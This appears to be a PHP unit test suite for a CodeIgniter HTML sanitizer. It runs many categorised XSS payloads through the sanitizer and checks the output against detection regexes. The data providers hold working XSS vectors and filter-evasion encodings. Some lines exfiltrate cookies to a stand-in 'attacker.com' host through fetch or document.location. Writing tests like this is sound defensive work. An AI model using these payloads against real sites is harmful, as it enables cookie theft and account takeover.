<?php
/**
 * @noinspection BadExpressionStatementJS
 * @noinspection JSVoidFunctionReturnValueUsed
 * @noinspection JSUnresolvedLibraryURL
 * @noinspection JSUnresolvedReference
 * @noinspection HtmlUnknownAttribute
 * @noinspection HtmlUnknownTarget
 * @noinspection CssInvalidAtRule
 * @noinspection CssInvalidFunction
 * @noinspection CssUnknownProperty
 * @noinspection CssInvalidPropertyValue
 * @noinspection CssUnknownTarget
 */

namespace Tests\Unit\Core\Libraries;

use App\Core\Libraries\Sanitizer;
use CodeIgniter\Test\CIUnitTestCase;

/**
 * Extensive Security Test Suite for Sanitizer Library.
 * This suite stress-tests the sanitizer against categorized XSS vectors.
 */
class SanitizerSecurityTest extends CIUnitTestCase
{
    protected Sanitizer $sanitizer;

    protected function setUp(): void
    {
        parent::setUp();
        $this->sanitizer = new Sanitizer();
    }

    /**
     * Helper assertion to verify the sanitized output is safe.
     * It checks for the absence of dangerous tags, attributes, and protocols.
     */
    protected function assertSecure(string $clean, string $originalPayload): void
    {
        // 1. Critical Tags that should never appear in sanitized output
        // Note: <button>, <details>, <style>, and <svg> are allowed if their dangerous attributes are stripped.
        $dangerousTags = [
            '<script',
            '<iframe',
            '<object',
            '<embed',
            '<applet',
            '<meta',
            '<link',
            '<body',
            '<form',
            '<input',
            '<textarea',
            '<keygen',
            '<marquee',
            '<isindex',
            '<math'
        ];

        foreach ($dangerousTags as $tag) {
            $this->assertStringNotContainsString(
                $tag,
                strtolower($clean),
                "Sanitizer failed to remove dangerous tag '$tag'. Original: $originalPayload"
            );
        }

        // 2. Dangerous Attributes (Event Handlers)
        // We check for 'on[a-z]' to catch any event handler like onerror, onload, onmouseover, etc.
        // We use a regex to ensure we don't match simple text like "one" or "onion" unless it looks like an attribute assignment.
        // Matches: onEvent=, onEvent = , onEvent  =
        if (preg_match('/on[a-z]+\s*=/i', $clean)) {
            $this->fail("Sanitizer failed to remove event handler (on*). Cleaned: $clean. Original: $originalPayload");
        }

        // 3. Dangerous Protocols
        // javascript:, vbscript:, data:, livescript:, file:
        // We look for these protocols specifically in an assignment context (e.g. href="javascript:...")
        // because the string "javascript:" is harmless in plain text content (e.g. "I learned javascript:").
        if (preg_match('/=\s*(\'|")?\s*(javascript|vbscript|livescript|file|data):/i', $clean)) {
            $this->fail("Sanitizer failed to remove dangerous protocol. Cleaned: $clean. Original: $originalPayload");
        }

        // 4. Dangerous CSS/Style Vectors
        // Checks for legacy CSS expressions, imports, and malicious URLs in style contexts.
        if (preg_match('/expression\s*\(/i', $clean)) {
            $this->fail("Sanitizer failed to remove CSS expression. Cleaned: $clean. Original: $originalPayload");
        }

        if (stripos($clean, '@import') !== false) {
            $this->fail("Sanitizer failed to remove @import. Cleaned: $clean. Original: $originalPayload");
        }

        if (preg_match('/url\s*\(\s*[\'"]?\s*(javascript|vbscript|livescript|file):/i', $clean)) {
            $this->fail("Sanitizer failed to remove dangerous URL in CSS. Cleaned: $clean. Original: $originalPayload");
        }
    }

    /**
     * @dataProvider provideAttributeBasedPayloads
     */
    public function testAttributeBasedXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideAttributeBasedPayloads(): iterable
    {
        $payloads = [
            '<img src=x onerror=alert(1)>',
            '<img src=x onerror="alert(\'XSS\')">',
            '<div onmouseover=alert(\'XSS\')>Hover me!</div>',
            '<a href="javascript:alert(1)">Click me</a>',
            '<input type="text" value="XSS" onfocus="alert(1)">',
            '<body onload="alert(\'XSS\')">',
            '<svg onload="alert(\'XSS\')"></svg>',
            '<marquee loop=1 width=0 onfinish=alert(1)>XSS</marquee>',
            '<audio src onerror=alert(\'XSS\')></audio>',
            '<iframe src="javascript:alert(1)"></iframe>',
            // Edge cases with spaces and control characters
            '<img src=x onerror  =  alert(1)>',
            '<img src=x onerror=  alert(1)>',
            '<img src=x onerror=\talert(1)>',
            '<img src=x onerror=\nalert(1)>',
            '<img src=x onerror=\r\nalert(1)>',
            // Malformed attributes
            '<body onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(1)>',
            '<img src="x" onerror =alert(1)>',
            '<a href="javascript&#58;alert(1)">Click</a>',
            '<a href="java&#09;script:alert(1)">Click</a>',
            '<a href="java&#10;script:alert(1)">Click</a>',
            '<a href="java&#13;script:alert(1)">Click</a>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideBlindPayloads
     */
    public function testBlindXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideBlindPayloads(): iterable
    {
        $payloads = [
            '<script src="https://attacker.com/xss.js"></script>',
            '<img src="x" onerror="fetch(\'https://attacker.com?c=\'+document.cookie)">',
            '<svg onload="fetch(\'https://attacker.com?d=\'+document.domain)"></svg>',
            '<body onload="fetch(\'https://attacker.com?l=\'+location)">',
            '<input value="<img src=x onerror=alert(1)>">',
            '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<a href="javascript:alert(1)">Click me</a>',
            '<svg><script>alert(1)</script></svg>',
            '<svg onload=alert(document.cookie)></svg>',
            '<img src=x onerror=alert(1)>',
            '"><script>alert(1)</script>',
            '<script>alert(1)</script>',
            '<details open ontoggle=alert(1)></details>',
            '<div onpointerenter=alert(1)>Hover me</div>',
            '<button onclick="alert(1)">Click</button>',
            '"><img src=x onerror=alert(1)>',
            '<marquee onstart=alert(1)>XSS</marquee>',
            '<a href="javascript:alert(document.cookie)">Click</a>',
            '<svg><g onload=alert(1)></g></svg>',
            '<x onmouseover=alert(1)>Hover</x>',
            '<iframe src=javascript:alert(1)></iframe>',
            '<svg onload=alert(1)></svg>',
            '<script>alert(\'XSS\')</script>',
            '"><script>alert(document.cookie)</script>',
            '<x onmouseover=alert(document.domain)>Hover</x>',
            '<img src=x onerror=alert(location)>',
            '<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></desc></svg>',
            '<img src=x onerror=fetch(\'https://attacker.com?c=\'+document.cookie)>',
            '<script>fetch(\'https://attacker.com?d=\'+document.domain)</script>',
            '<iframe src="https://attacker.com?c="+document.cookie></iframe>',
            '<body onload=fetch(\'https://attacker.com?l=\'+location)></body>',
            '"><img src=x onerror=alert(\'XSS\')>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideCookiePayloads
     */
    public function testCookieBasedXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideCookiePayloads(): iterable
    {
        $payloads = [
            '<script>document.cookie="xss=1";</script>',
            '<script>alert(document.cookie)</script>',
            '<img src=x onerror="alert(document.cookie)">',
            '<iframe src="javascript:alert(document.cookie)"></iframe>',
            '<svg onload="alert(document.cookie)"></svg>',
            '<video poster=1 onerror="alert(document.cookie)"></video>',
            '<body onload="alert(document.cookie)">',
            '<object data="javascript:alert(document.cookie)"></object>',
            '<embed src="javascript:alert(document.cookie)">',
            '<a href="javascript:alert(document.cookie)">Click me</a>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideDomPayloads
     */
    public function testDomBasedXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideDomPayloads(): iterable
    {
        $payloads = [
            '<script>document.location=\'https://attacker.com/?cookie=\'+document.cookie</script>',
            '<img src="x" onerror="document.location=\'https://attacker.com/?cookie=\'+document.cookie">',
            '<script>eval(\'document.location="https://attacker.com/?cookie="+document.cookie\')</script>',
            '<iframe src="javascript:alert(document.domain)"></iframe>',
            '<a href="javascript:alert(document.domain)">Click me</a>',
            '<svg onload="document.location=\'https://attacker.com/?cookie=\'+document.cookie"></svg>',
            '<script>window.location.href=\'https://attacker.com?cookie=\'+document.cookie</script>',
            '<input value="<img src=\'x\' onerror=\'alert(1)\'>">',
            '<svg><script>alert(1)</script></svg>',
            '<img src="x" onerror="alert(\'DOM XSS\')">',
            '<script>eval(\'document . location = "https://attacker.com/?cookie=" + document . cookie\')</script>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideMutationPayloads
     */
    public function testMutationXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideMutationPayloads(): iterable
    {
        $payloads = [
            '<IMG SRC="javascript:alert(\'XSS\')">',
            '<IMG SRC=`javascript:alert("XSS")`>',
            '<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',
            '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>',
            '<IMG SRC=javascript:alert(\'XSS\')>',
            '"><IMG SRC=javascript:alert(\'XSS\')>',
            '<IMG SRC="jav	ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x09;ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',
            '<IMG SRC="jav&#x0D;ascript:alert(document.domain)">',
            '<IMG SRC="javascript:alert`1`">',
            '<IMG SRC="javascript:confirm`1`">',
            '<IMG SRC="javascript:prompt`1`">',
            '<IMG SRC=javascript:alert(document.cookie)>',
            '<IMG SRC=javascript:alert(1)//>',
            '<IMG SRC=javascript:alert(1)<!-->',
            '<IMG SRC=javascript:alert(1)>>',
            '<IMG SRC="javascript:alert(1)">',
            '<IMG SRC=javascript:alert(1)>',
            '<article xmlns="urn:img src=x onerror=alert(1)//">',
            '<math><mtext><table><mglyph src="javascript:alert(1)">',
            '<img src="x` `<script>javascript:alert(1)</script>"` `>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider providePolyglotPayloads
     */
    public function testPolyglotXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function providePolyglotPayloads(): iterable
    {
        $payloads = [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(1)>',
            '"><svg onload=alert(1)>',
            '"><body onload=alert(1)>',
            '"><iframe src=javascript:alert(1)>',
            '";alert(1)//',
            '</title><script>alert(1)</script>',
            '"><a href=javascript:alert(1)>Click me</a>',
            '"><details open ontoggle=alert(1)>',
            '"><marquee onstart=alert(1)>XSS</marquee>',
            'javascript://%250Aalert(1)//',
            '<a href="javascript://%250Aalert(1)//" onload=alert(1)//">Link</a>',
            '\'"><svg/onload=alert(1)>',
            '<!--<img src="--><img src=x onerror=alert(1)//">',
            '<comment><img src="</comment><img src=x onerror=alert(1))//">',
            '<![><img src="]><img src=x onerror=alert(1)//">',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider providePostBasedPayloads
     */
    public function testPostBasedXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function providePostBasedPayloads(): iterable
    {
        $payloads = [
            '<input type="text" value="<script>alert(\'XSS\')</script>">',
            '<textarea><script>alert(\'XSS\')</script></textarea>',
            '<form><button formaction="javascript:alert(\'XSS\')">Click me</button></form>',
            '<form><input type="hidden" name="xss" value="<script>alert(\'XSS\')</script>"></form>',
            '<input type="text" onfocus="alert(\'XSS\')" value="Focus me">',
            '<input type="button" value="Click me" onclick="alert(\'XSS\')">',
            '<form action="https://example.com/post" method="POST"><input type="text" value="<script>alert(\'XSS\')</script>"></form>',
            '<input type="text" value=\'"><script>alert(1)</script>\'>',
            '<input type="text" value=\'"><img src=x onerror=alert(1)>\'>',
            '<form><input name="xss" value="<img src=x onerror=alert(\'XSS\')>"></form>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideReflectedPayloads
     */
    public function testReflectedXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideReflectedPayloads(): iterable
    {
        $payloads = [
            '<script>alert(\'XSS\')</script>',
            '<img src=x onerror=alert(\'XSS\')>',
            '<a href="javascript:alert(\'XSS\')">Click me</a>',
            '<svg onload=alert(\'XSS\')>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>',
            '<marquee onstart=alert(\'XSS\')>XSS</marquee>',
            '<body onload=alert(\'XSS\')>',
            '<input value="<script>alert(\'XSS\')</script>">',
            '<object data="javascript:alert(\'XSS\')"></object>',
            '<embed src="javascript:alert(\'XSS\')">',
            '"><script>alert(\'XSS\')</script>',
            '"></textarea><script>alert(\'XSS\')</script>',
            '"></style><script>alert(\'XSS\')</script>',
            '"></title><script>alert(\'XSS\')</script>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideSelfPayloads
     */
    public function testSelfXss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideSelfPayloads(): iterable
    {
        $payloads = [
            '"><script>alert(1)</script>',
            '"><img src=x onerror=alert(\'XSS\')>',
            '"><svg onload=alert(\'XSS\')>',
            '"><a href="javascript:alert(\'XSS\')">Click Me</a>',
            '"><body onload=alert(\'XSS\')>',
            '"><input value="<svg onload=alert(1)>">',
            '"><textarea><svg onload=alert(\'XSS\')></textarea>',
            '"><iframe src=javascript:alert(\'XSS\')>',
            '"><math><mtext></mtext><script>alert(\'XSS\')</script></math>',
            '"><marquee onstart=alert(\'XSS\')>XSS</marquee>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideUxssPayloads
     */
    public function testUxss(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideUxssPayloads(): iterable
    {
        $payloads = [
            '<iframe src="javascript:alert(\'UXSS\')"></iframe>',
            '<object data="javascript:alert(\'UXSS\')"></object>',
            '<embed src="javascript:alert(\'UXSS\')"></embed>',
            '<svg><script>alert(\'UXSS\')</script></svg>',
            '<svg onload=alert(\'UXSS\')></svg>',
            '<iframe src="data:text/html,<svg onload=alert(\'UXSS\')>"></iframe>',
            '<svg><a href="javascript:alert(\'UXSS\')">CLICK</a></svg>',
            '<iframe src="javascript:alert(\'UXSS\')" onload=alert(\'UXSS\')></iframe>',
            '<script>window.open(\'javascript:alert("UXSS")\')</script>',
            '<img src=x onerror="window.open(\'javascript:alert(1)\')">',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideStylePayloads
     */
    public function testStyleSanitization(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideStylePayloads(): iterable
    {
        $payloads = [
            '<div style="width: expression(alert(1));">',
            '<div style="background-image: url(javascript:alert(1))">',
            '<div style="behavior: url(xss.htc);">',
            '<style>@import "javascript:alert(1)";</style>',
            '<style>@import \'javascript:alert(1)\';</style>',
            '<style>body { background-image: url("javascript:alert(1)"); }</style>',
            '<img style="xss:expression(alert(1))">',
            '<div style="background:url(java script:alert(1))">',
            '<link rel="stylesheet" href="javascript:alert(1);">',
            '<style>li {list-style-image: url("javascript:alert(1)");}</style>',
            '<style>@im\port\'\ja\vasc\ript:alert(1)\';</style>',
            '<img style=\'xss:expr/*XSS*/ession(alert(1))\'>',
            '<style>.XSS{background-image:url("javascript:alert(1)");}</style>',
            '<style>BODY{background:url("javascript:alert(1)")}</style>',
            '<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">',
            '<div style="width:e/**/xpression(alert(1))">',
            '<style>p[foo=bar{}*{-o-link:\'javascript:alert(1)\'}{}*{-o-link-source:current}]{color:red};</style>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }

    /**
     * @dataProvider provideCircularPayloads
     */
    public function testCircularSanitization(string $payload): void
    {
        $clean = $this->sanitizer->sanitizeHtml($payload);
        $this->assertSecure($clean, $payload);
    }

    public static function provideCircularPayloads(): iterable
    {
        $payloads = [
            '<img src="java\0script:alert(1)">',
            '<a href="javascrip\t:alert(1)">',
            '<a href="jav&#x09;ascript:alert(1);">',
            '<a href="jav&#x0A;ascript:alert(1);">',
            '<a href="jav&#x0D;ascript:alert(1);">',
            '<img src="jav	ascript:alert(1);">',
            '<img src="javajavascript:script:alert(1)">',
            '<a href="javjavascriptascript:alert(1)">',
            '<scr<script>ipt>alert(1)</script>',
            '<<script>alert(1);//<</script>',
            '<script>alert(1)</script>',
            '<iframe src="j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:alert(1)"></iframe>',
        ];
        foreach ($payloads as $p) {
            yield [$p];
        }
    }
}